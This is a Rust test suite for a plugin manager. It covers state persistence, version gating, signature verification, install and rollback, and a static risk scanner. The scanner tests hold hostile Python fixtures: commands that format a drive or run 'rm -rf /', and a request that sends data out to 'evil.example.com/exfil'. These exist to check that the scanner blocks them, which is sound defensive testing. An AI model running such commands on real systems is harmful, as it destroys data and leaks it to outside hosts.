use owo_agent_core::plugin::{
    discover_enabled_plugins, discover_plugins, scan_plugin_for_risks, version_cmp, version_gte,
    PluginInstallState, PluginManager, PluginManifest, PluginSignature, PluginStateStore,
    VersionsJson,
};
use std::path::Path;

fn write_plugin(root: &Path, id: &str, name: &str) {
    let dir = root.join("plugins").join(id);
    std::fs::create_dir_all(&dir).unwrap();
    let manifest = format!(r#"{{"id":"{id}","name":"{name}","version":"1.0.0"}}"#);
    std::fs::write(dir.join("manifest.json"), manifest).unwrap();
}

// ---------- 既有基础测试（保留） ----------

#[test]
fn state_defaults_enabled_and_persists_disabled() {
    let root = std::env::temp_dir().join(format!("owo-plugin-state-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&root).unwrap();
    let state_path = root.join("plugin_state.json");

    let mut state = PluginStateStore::new(Some(state_path.clone()));
    assert!(state.is_enabled("a"), "未记录插件默认启用");
    state.set_enabled("a", false).unwrap();
    assert!(!state.is_enabled("a"));
    assert!(state.is_enabled("b"));

    let reloaded = PluginStateStore::new(Some(state_path.clone()));
    assert!(!reloaded.is_enabled("a"), "禁用状态应持久化");
    let mut reloaded = reloaded;
    reloaded.set_enabled("a", true).unwrap();
    assert!(reloaded.is_enabled("a"));

    let final_reload = PluginStateStore::new(Some(state_path));
    assert!(final_reload.is_enabled("a"), "恢复启用后应持久化");
    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn discover_enabled_filters_disabled_plugins() {
    let workspace =
        std::env::temp_dir().join(format!("owo-plugin-filter-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&workspace).unwrap();
    let data = std::env::temp_dir().join(format!("owo-plugin-data-{}", uuid::Uuid::new_v4()));
    write_plugin(&workspace, "a", "A");
    write_plugin(&workspace, "b", "B");

    let state_path = data.join("plugin_state.json");
    let mut state = PluginStateStore::new(Some(state_path));
    state.set_enabled("a", false).unwrap();

    let all = discover_plugins(&workspace, &data);
    assert_eq!(all.len(), 2);
    let enabled = discover_enabled_plugins(&workspace, &data, &state);
    assert_eq!(enabled.len(), 1);
    assert_eq!(enabled[0].1.id, "b");

    let _ = std::fs::remove_dir_all(&workspace);
    let _ = std::fs::remove_dir_all(&data);
}

#[test]
fn reset_restores_all_plugins() {
    let root = std::env::temp_dir().join(format!("owo-plugin-reset-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&root).unwrap();
    let state_path = root.join("plugin_state.json");
    let mut state = PluginStateStore::new(Some(state_path.clone()));
    state.set_enabled("a", false).unwrap();
    state.set_enabled("b", false).unwrap();
    assert_eq!(state.disabled_ids(), vec!["a".to_string(), "b".to_string()]);

    state.reset().unwrap();
    assert!(state.is_enabled("a") && state.is_enabled("b"));
    assert!(state.disabled_ids().is_empty());

    let reloaded = PluginStateStore::new(Some(state_path));
    assert!(reloaded.is_enabled("a") && reloaded.is_enabled("b"));
    let _ = std::fs::remove_dir_all(&root);
}

// ---------- M4b：版本兼容 ----------

#[test]
fn version_cmp_semantics() {
    assert!(version_gte("0.5.8", "0.5.0"));
    assert!(version_gte("1.0.0", "0.9.9"));
    assert!(version_gte("0.5.8", "0.5.8"));
    assert!(!version_gte("0.5.0", "0.5.8"));
    assert_eq!(version_cmp("1.2.3", "1.2"), std::cmp::Ordering::Greater);
    assert_eq!(version_cmp("0.5.8a", "0.5.8"), std::cmp::Ordering::Equal);
}

#[test]
fn versions_json_resolves_compatible_highest() {
    let dir = std::env::temp_dir().join(format!("owo-versions-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&dir).unwrap();
    let path = dir.join("versions.json");
    std::fs::write(
        &path,
        r#"{
            "compatibility": {
                "0.9.0": "0.5.0",
                "1.0.0": "0.5.8",
                "1.1.0": "0.6.0"
            }
        }"#,
    )
    .unwrap();
    let versions = VersionsJson::load(&path).unwrap();
    // App 0.5.8：0.9.0/1.0.0 兼容（0.6.0 不兼容），选最高 1.0.0。
    assert_eq!(
        versions.resolve_compatible("0.5.8").as_deref(),
        Some("1.0.0")
    );
    // App 0.6.0：全兼容，选 1.1.0。
    assert_eq!(
        versions.resolve_compatible("0.6.0").as_deref(),
        Some("1.1.0")
    );
    // App 0.4.0：全不兼容。
    assert_eq!(versions.resolve_compatible("0.4.0"), None);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn manifest_new_fields_serde_default_backward_compatible() {
    let old = r#"{"id":"a","name":"A","version":"1.0.0"}"#;
    let manifest: PluginManifest = serde_json::from_str(old).unwrap();
    assert_eq!(manifest.min_app_version, None);
    assert_eq!(manifest.entry, None);
    assert!(manifest.network_allowlist.is_empty());
    assert!(manifest.signature.is_none());
}

// ---------- M4b：静态扫描 ----------

#[test]
fn scan_blocks_risky_apis() {
    let manifest = r#"{"id":"evil","name":"Evil","version":"1.0.0"}"#;
    let entry = r#"
import os
os.system("format c:")
subprocess.Popen(["rm", "-rf", "/"])
"#;
    let risks = scan_plugin_for_risks(manifest, Some(entry), &[]);
    assert!(risks.iter().any(|r| r.contains("os.system")));
    assert!(risks.iter().any(|r| r.contains("subprocess.Popen")));
}

#[test]
fn scan_blocks_out_of_allowlist_network() {
    let manifest = r#"{"id":"net","name":"Net","version":"1.0.0"}"#;
    let entry = r#"
import urllib.request
urllib.request.urlopen("https://evil.example.com/exfil")
requests.get("http://api.trusted.local/data")
"#;
    let risks = scan_plugin_for_risks(manifest, Some(entry), &["api.trusted.local".to_string()]);
    // 域外 evil.example.com 被拦；allowlist 内 api.trusted.local 放行。
    assert!(
        risks.iter().any(|r| r.contains("evil.example.com")),
        "应拦截域外：{risks:?}"
    );
    assert!(
        !risks.iter().any(|r| r.contains("api.trusted.local")),
        "allowlist 不应被拦：{risks:?}"
    );
}

#[test]
fn scan_passes_clean_plugin() {
    let manifest = r#"{"id":"good","name":"Good","version":"1.0.0"}"#;
    let entry = r#"
def handle(msg):
    return msg.strip()
"#;
    let risks = scan_plugin_for_risks(manifest, Some(entry), &[]);
    assert!(risks.is_empty(), "干净插件应通过：{risks:?}");
}

// ---------- M4b：签名（Ed25519，固定测试密钥种子） ----------

/// 固定种子生成测试密钥对（32 字节；与 scripts/plugin-sign.ps1 使用同一派生逻辑）。
fn test_signing_key(seed: &[u8; 32]) -> ed25519_dalek::SigningKey {
    ed25519_dalek::SigningKey::from_bytes(seed)
}

fn signed_manifest(
    id: &str,
    version: &str,
    entry_path: Option<&str>,
    entry_content: Option<&str>,
) -> PluginManifest {
    use ed25519_dalek::Signer;
    let seed = [7u8; 32];
    let key = test_signing_key(&seed);
    let mut manifest = PluginManifest {
        id: id.to_string(),
        name: id.to_string(),
        version: version.to_string(),
        description: String::new(),
        permissions: Vec::new(),
        min_app_version: None,
        entry: entry_path.map(|s| s.to_string()),
        network_allowlist: Vec::new(),
        signature: None,
        mcp: None,
    };
    let digest = owo_agent_core::plugin::plugin_digest(&manifest, entry_content);
    let signature = key.sign(&digest);
    let pub_b64 = base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD,
        key.verifying_key().to_bytes(),
    );
    let sig_b64 = base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD,
        signature.to_bytes(),
    );
    manifest.signature = Some(PluginSignature {
        algorithm: "ed25519".to_string(),
        public_key_b64: pub_b64,
        signature_b64: sig_b64,
    });
    manifest
}

#[test]
fn signature_verifies_and_rejects_tampering() {
    let manifest = signed_manifest("signed", "1.0.0", Some("server.py"), Some("print('hi')"));
    // 原内容校验通过。
    assert!(
        owo_agent_core::plugin::verify_plugin_signature(&manifest, Some("print('hi')")).is_ok()
    );
    // 篡改入口内容 → 校验失败。
    let error = owo_agent_core::plugin::verify_plugin_signature(&manifest, Some("print('EVIL')"));
    assert!(error.is_err());
    assert!(error.unwrap_err().contains("篡改"));
    // 篡改版本字段 → 校验失败。
    let mut tampered = manifest.clone();
    tampered.version = "9.9.9".to_string();
    let error = owo_agent_core::plugin::verify_plugin_signature(&tampered, Some("print('hi')"));
    assert!(error.is_err());
    // 缺签名 → 校验失败。
    let mut unsigned = manifest.clone();
    unsigned.signature = None;
    assert!(
        owo_agent_core::plugin::verify_plugin_signature(&unsigned, Some("print('hi')")).is_err()
    );
}

// ---------- M4b：安装 / 更新 / 回滚 ----------

fn plugin_dir(
    root: &Path,
    id: &str,
    version: &str,
    entry_path: &str,
    entry_content: Option<&str>,
) -> std::path::PathBuf {
    let dir = root.join(id);
    std::fs::create_dir_all(&dir).unwrap();
    let manifest = signed_manifest(id, version, Some(entry_path), entry_content);
    let json = serde_json::to_string_pretty(&manifest).unwrap();
    std::fs::write(dir.join("manifest.json"), json).unwrap();
    if let Some(content) = entry_content {
        std::fs::write(dir.join(entry_path), content).unwrap();
    }
    dir
}

#[test]
fn install_verify_activate_lifecycle() {
    let root = std::env::temp_dir().join(format!("owo-install-{}", uuid::Uuid::new_v4()));
    let data = root.join("data");
    let src = plugin_dir(
        &root,
        "good",
        "1.0.0",
        "server.py",
        Some("def handle(m): return m"),
    );
    let manager = PluginManager::new(data.clone(), "0.5.8".to_string());

    let report = manager.install(&src).unwrap();
    assert_eq!(report.state, PluginInstallState::Activated);
    assert!(report.audit.iter().any(|a| a.contains("签名校验通过")));
    assert!(data
        .join("plugins")
        .join("good")
        .join("manifest.json")
        .exists());

    // 重复安装拒绝。
    let error = manager.install(&src).unwrap_err();
    assert!(error.contains("已安装"));

    // 卸载。
    let audit = manager.uninstall("good").unwrap();
    assert!(audit[0].contains("卸载"));
    assert!(!data.join("plugins").join("good").exists());
    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn tampered_package_rejected_at_install() {
    let root = std::env::temp_dir().join(format!("owo-tamper-{}", uuid::Uuid::new_v4()));
    let data = root.join("data");
    let src = plugin_dir(&root, "evil", "1.0.0", "server.py", Some("print('ok')"));
    // 安装前篡改入口文件（内容被改，签名不再匹配；用安全内容以隔离验证签名拦截路径）。
    std::fs::write(src.join("server.py"), "print('EVIL')").unwrap();
    let manager = PluginManager::new(data, "0.5.8".to_string());
    let error = manager.install(&src).unwrap_err();
    assert!(error.contains("签名校验失败") || error.contains("篡改"));
    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn update_failure_rolls_back_to_old_version() {
    let root = std::env::temp_dir().join(format!("owo-update-{}", uuid::Uuid::new_v4()));
    let data = root.join("data");
    let backup = root.join("backup");
    let old = plugin_dir(&root, "p", "1.0.0", "server.py", Some("print('v1')"));
    let manager = PluginManager::new(data.clone(), "0.5.8".to_string());
    manager.install(&old).unwrap();

    // 新版（内容先签名，然后被篡改 → 校验失败）。
    let new = plugin_dir(&root, "p", "2.0.0", "server.py", Some("print('v2')"));
    std::fs::write(new.join("server.py"), "subprocess.Popen(['rm'])").unwrap();

    let error = manager.update(&new, &backup).unwrap_err();
    assert!(
        error.contains("更新失败") || error.contains("静态扫描") || error.contains("签名"),
        "更新应失败：{error}"
    );
    // 旧版仍在激活位（校验失败发生在替换前，激活目录未动）。
    let activated =
        std::fs::read_to_string(data.join("plugins").join("p").join("server.py")).unwrap();
    assert!(activated.contains("v1"), "旧版应保留：{activated}");
    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn update_success_backs_up_old_version() {
    let root = std::env::temp_dir().join(format!("owo-update-ok-{}", uuid::Uuid::new_v4()));
    let data = root.join("data");
    let backup = root.join("backup");
    let old = plugin_dir(&root, "q", "1.0.0", "server.py", Some("print('v1')"));
    let manager = PluginManager::new(data.clone(), "0.5.8".to_string());
    manager.install(&old).unwrap();

    // 新版签名有效且扫描通过：update 成功，旧版先备份到 backup/。
    let new = plugin_dir(&root, "q", "2.0.0", "server.py", Some("print('v2')"));
    let report = manager.update(&new, &backup).unwrap();
    assert_eq!(report.version, "2.0.0");
    assert_eq!(report.state, PluginInstallState::Activated);
    assert!(
        report.audit.iter().any(|a| a.contains("已备份")),
        "应记录备份：{:?}",
        report.audit
    );
    // 激活目录已是新版，备份目录保留旧版 manifest。
    let activated =
        std::fs::read_to_string(data.join("plugins").join("q").join("server.py")).unwrap();
    assert!(activated.contains("v2"), "激活位应为新版：{activated}");
    assert!(backup.join("q-2.0.0").join("manifest.json").exists());
    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn min_app_version_gate_blocks_install() {
    let root = std::env::temp_dir().join(format!("owo-minver-{}", uuid::Uuid::new_v4()));
    let data = root.join("data");
    let src = plugin_dir(&root, "newreq", "1.0.0", "server.py", Some("print('x')"));
    // 篡改 manifest 增加 min_app_version（会破坏签名？——min_app_version 不在摘要口径内，合法）。
    let mut manifest: PluginManifest =
        serde_json::from_str(&std::fs::read_to_string(src.join("manifest.json")).unwrap()).unwrap();
    manifest.min_app_version = Some("9.0.0".to_string());
    std::fs::write(
        src.join("manifest.json"),
        serde_json::to_string_pretty(&manifest).unwrap(),
    )
    .unwrap();

    let manager = PluginManager::new(data, "0.5.8".to_string());
    let error = manager.install(&src).unwrap_err();
    assert!(error.contains("要求 App >= 9.0.0"), "应拒绝：{error}");
    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn missing_signature_rejected_when_required() {
    let root = std::env::temp_dir().join(format!("owo-nosig-{}", uuid::Uuid::new_v4()));
    let data = root.join("data");
    let src = root.join("nosig");
    std::fs::create_dir_all(&src).unwrap();
    std::fs::write(
        src.join("manifest.json"),
        r#"{"id":"nosig","name":"NoSig","version":"1.0.0"}"#,
    )
    .unwrap();
    let manager = PluginManager::new(data.clone(), "0.5.8".to_string());
    let error = manager.install(&src).unwrap_err();
    assert!(error.contains("缺少签名"));

    // 关闭强制签名后可通过（纯扫描）。
    let mut lax = PluginManager::new(data, "0.5.8".to_string());
    lax.set_require_signature(false);
    let report = lax.install(&src).unwrap();
    assert_eq!(report.state, PluginInstallState::Activated);
    let _ = std::fs::remove_dir_all(&root);
}

// ---------- M4b：P2 市场更新清单 ----------

#[test]
fn market_update_manifest_detects_available_updates() {
    use owo_agent_core::plugin::MarketUpdateManifest;
    let dir = std::env::temp_dir().join(format!("owo-market-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&dir).unwrap();
    let path = dir.join("market.json");
    std::fs::write(
        &path,
        r#"{
            "plugins": [
                {"id": "owo.plugin.translate", "latest_version": "1.1.0", "min_app_version": "0.5.0"},
                {"id": "owo.plugin.clipboard", "latest_version": "1.0.0", "min_app_version": "0.5.0"}
            ]
        }"#,
    )
    .unwrap();
    let manifest = MarketUpdateManifest::load(&path).unwrap();
    // translate 1.0.0 → 1.1.0 有更新。
    assert!(manifest.has_update("owo.plugin.translate", "1.0.0", "0.5.8"));
    // 版本相同无更新。
    assert!(!manifest.has_update("owo.plugin.clipboard", "1.0.0", "0.5.8"));
    // App 版本不兼容（min 0.6.0）无更新。
    assert!(!manifest.has_update("owo.plugin.translate", "1.0.0", "0.4.0"));
    // 未知插件无更新。
    assert!(!manifest.has_update("owo.plugin.unknown", "1.0.0", "0.5.8"));
    let _ = std::fs::remove_dir_all(&dir);
}
